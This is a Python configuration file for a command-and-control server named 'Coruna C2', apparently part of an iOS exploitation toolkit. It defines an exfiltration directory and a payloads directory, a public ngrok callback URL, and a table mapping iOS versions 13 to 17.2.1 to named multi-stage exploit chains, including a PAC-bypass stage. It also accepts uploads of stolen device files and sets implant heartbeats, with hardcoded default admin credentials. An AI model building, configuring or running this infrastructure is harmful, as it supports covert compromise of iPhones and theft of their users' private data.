"""Coruna C2 配置文件"""

import os
from pathlib import Path
from typing import Optional

# 项目根目录
PROJECT_ROOT = Path(__file__).resolve().parent.parent

# 服务器配置
HOST = os.getenv("CORUNA_HOST", "0.0.0.0")
PORT = int(os.getenv("CORUNA_PORT", "8782"))

# 数据库配置
DATABASE_URL = os.getenv("DATABASE_URL", f"sqlite:///{PROJECT_ROOT}/coruna_c2.db")

# 管理员认证
ADMIN_USER = os.getenv("ADMIN_USER", "admin")
ADMIN_PASS = os.getenv("ADMIN_PASS", "admin123")
SECRET_KEY = os.getenv("SECRET_KEY", "coruna-secret-key-change-in-production")
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 60 * 24  # 24 hours

# 目录配置
EXFIL_DIR = PROJECT_ROOT / "exfil"
PAYLOADS_DIR = PROJECT_ROOT / "payloads"
LOG_DIR = PROJECT_ROOT / "log"
STATIC_DIR = PROJECT_ROOT / "backend" / "static"

# 确保目录存在
for directory in [EXFIL_DIR, PAYLOADS_DIR, LOG_DIR, STATIC_DIR]:
    directory.mkdir(parents=True, exist_ok=True)

# Coruna 特定配置
DEFAULT_PUBLIC_URL = "https://snippet-stunt-backrest.ngrok-free.dev"
CORUNA_SERVER_URL = os.getenv("CORUNA_SERVER_URL", DEFAULT_PUBLIC_URL)

# 支持的 iOS 版本范围
SUPPORTED_IOS_VERSIONS = {
    "13.0": "buffout",
    "13.0-14.x": "breezy",
    "15.0-15.1.1": "breezy15",
    "15.2-15.5": "jacurutu",
    "15.6-16.1.2": "bluebird",
    "16.2-16.5.1": "terrorbird",
    "16.3-16.5.1": "seedbell",
    "16.6-16.7.12": "seedbell",
    "16.6-17.2.1": "seedbell_pre",
    "17.0-17.2.1": "seedbell_17"
}

# Exploit 阶段配置
EXPLOIT_STAGES = {
    "stage1": {
        "jacurutu": "iOS 15.2-15.5",
        "bluebird": "iOS 15.6-16.1.2",
        "terrorbird": "iOS 16.2-16.5.1",
        "cassowary": "iOS 16.6-17.2.1",
        "buffout": "iOS 13.0-15.1.1"
    },
    "stage2": {
        "breezy": "iOS 13.0-14.x",
        "breezy15": "iOS 15.0-16.2",
        "seedbell": "iOS 16.3-16.7.12",
        "seedbell_pre": "iOS 16.6-17.2.1 (pre)",
        "seedbell_17": "iOS 17.0-17.2.1"
    },
    "stage3": {
        "variantA": "With PAC bypass",
        "variantB": "Without PAC / different approach"
    }
}

# 任务配置
TASK_TIMEOUT = 300  # 5 minutes
HEARTBEAT_INTERVAL = 30  # 30 seconds
MAX_RETRY_COUNT = 3

# 数据收集配置
MAX_PREVIEW_SIZE = 2048  # 文本预览大小
MAX_BINARY_PREVIEW = 512  # 二进制预览大小（base64）

# 日志配置
LOG_LEVEL = os.getenv("LOG_LEVEL", "INFO")
LOG_FORMAT = "%(asctime)s - %(name)s - %(levelname)s - %(message)s"

# CORS 配置
CORS_ORIGINS = [
    origin.strip()
    for origin in os.getenv("CORS_ORIGINS", DEFAULT_PUBLIC_URL).split(",")
    if origin.strip()
]

# 文件上传配置
MAX_UPLOAD_SIZE = 100 * 1024 * 1024  # 100MB
ALLOWED_FILE_TYPES = [
    ".jpg", ".jpeg", ".png", ".gif", ".bmp",  # 图片
    ".mp4", ".mov", ".avi", ".mkv",  # 视频
    ".mp3", ".wav", ".m4a",  # 音频
    ".pdf", ".doc", ".docx", ".txt", ".xls", ".xlsx",  # 文档
    ".zip", ".rar", ".7z",  # 压缩文件
    ".plist", ".db", ".sqlite",  # 系统文件
    ".dylib", ".bin",  # 二进制文件
]

# WebSocket 配置
WS_HEARTBEAT_INTERVAL = 30
WS_MESSAGE_QUEUE_SIZE = 100

# 安全配置
RATE_LIMIT_ENABLED = True
RATE_LIMIT_PER_MINUTE = 60
IP_WHITELIST_ENABLED = False
IP_WHITELIST = []

# 备份配置
BACKUP_ENABLED = True
BACKUP_INTERVAL_HOURS = 24
BACKUP_RETENTION_DAYS = 7

# 监控配置
MONITORING_ENABLED = True
ALERT_EMAIL_ENABLED = False
ALERT_EMAIL_SMTP = "smtp.gmail.com"
ALERT_EMAIL_PORT = 587
ALERT_EMAIL_USER = ""
ALERT_EMAIL_PASSWORD = ""
ALERT_EMAIL_TO = []

class Config:
    """配置类"""
    
    # 服务器
    HOST: str = HOST
    PORT: int = PORT
    
    # 数据库
    DATABASE_URL: str = DATABASE_URL
    
    # 认证
    ADMIN_USER: str = ADMIN_USER
    ADMIN_PASS: str = ADMIN_PASS
    SECRET_KEY: str = SECRET_KEY
    ALGORITHM: str = ALGORITHM
    ACCESS_TOKEN_EXPIRE_MINUTES: int = ACCESS_TOKEN_EXPIRE_MINUTES
    
    # 目录
    EXFIL_DIR: Path = EXFIL_DIR
    PAYLOADS_DIR: Path = PAYLOADS_DIR
    LOG_DIR: Path = LOG_DIR
    STATIC_DIR: Path = STATIC_DIR
    
    # Coruna
    CORUNA_SERVER_URL: str = CORUNA_SERVER_URL
    
    # 支持的版本
    SUPPORTED_IOS_VERSIONS: dict = SUPPORTED_IOS_VERSIONS
    EXPLOIT_STAGES: dict = EXPLOIT_STAGES
    
    # 任务
    TASK_TIMEOUT: int = TASK_TIMEOUT
    HEARTBEAT_INTERVAL: int = HEARTBEAT_INTERVAL
    MAX_RETRY_COUNT: int = MAX_RETRY_COUNT
    
    # 数据收集
    MAX_PREVIEW_SIZE: int = MAX_PREVIEW_SIZE
    MAX_BINARY_PREVIEW: int = MAX_BINARY_PREVIEW
    
    # 日志
    LOG_LEVEL: str = LOG_LEVEL
    LOG_FORMAT: str = LOG_FORMAT
    
    # CORS
    CORS_ORIGINS: list = CORS_ORIGINS
    
    # 文件上传
    MAX_UPLOAD_SIZE: int = MAX_UPLOAD_SIZE
    ALLOWED_FILE_TYPES: list = ALLOWED_FILE_TYPES
    
    # WebSocket
    WS_HEARTBEAT_INTERVAL: int = WS_HEARTBEAT_INTERVAL
    WS_MESSAGE_QUEUE_SIZE: int = WS_MESSAGE_QUEUE_SIZE
    
    # 安全
    RATE_LIMIT_ENABLED: bool = RATE_LIMIT_ENABLED
    RATE_LIMIT_PER_MINUTE: int = RATE_LIMIT_PER_MINUTE
    IP_WHITELIST_ENABLED: bool = IP_WHITELIST_ENABLED
    IP_WHITELIST: list = IP_WHITELIST
    
    # 备份
    BACKUP_ENABLED: bool = BACKUP_ENABLED
    BACKUP_INTERVAL_HOURS: int = BACKUP_INTERVAL_HOURS
    BACKUP_RETENTION_DAYS: int = BACKUP_RETENTION_DAYS
    
    # 监控
    MONITORING_ENABLED: bool = MONITORING_ENABLED
    ALERT_EMAIL_ENABLED: bool = ALERT_EMAIL_ENABLED
    ALERT_EMAIL_SMTP: str = ALERT_EMAIL_SMTP
    ALERT_EMAIL_PORT: int = ALERT_EMAIL_PORT
    ALERT_EMAIL_USER: str = ALERT_EMAIL_USER
    ALERT_EMAIL_PASSWORD: str = ALERT_EMAIL_PASSWORD
    ALERT_EMAIL_TO: list = ALERT_EMAIL_TO

# 全局配置实例
config = Config()

def get_config() -> Config:
    """获取配置实例"""
    return config
